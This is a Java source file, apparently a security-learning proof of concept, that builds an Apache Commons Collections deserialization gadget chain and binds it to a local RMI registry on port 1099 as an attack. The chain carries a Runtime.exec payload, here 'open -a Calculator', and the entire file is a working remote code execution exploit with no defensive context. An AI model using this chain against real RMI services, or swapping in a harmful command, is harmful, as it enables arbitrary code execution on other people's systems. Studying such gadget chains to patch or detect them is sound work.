package com.ocean;

import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RMIattack_bind {
    public static void main(String[] args) throws Exception {
        try {

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"}),
            };
            Transformer transformer = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map ouputMap = LazyMap.decorate(innerMap, transformer);

            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, "pwn");
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, tiedMapEntry);

            Map tmpMap = new HashMap();
            tmpMap.put("pwn", badAttributeValueExpException);
            Constructor<?> ctor = null;
            ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);
            Remote remote = Remote.class.cast(Proxy.newProxyInstance(RMIattack_bind.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
            Registry registry = LocateRegistry.getRegistry(1099);
            registry.bind("hello1", remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
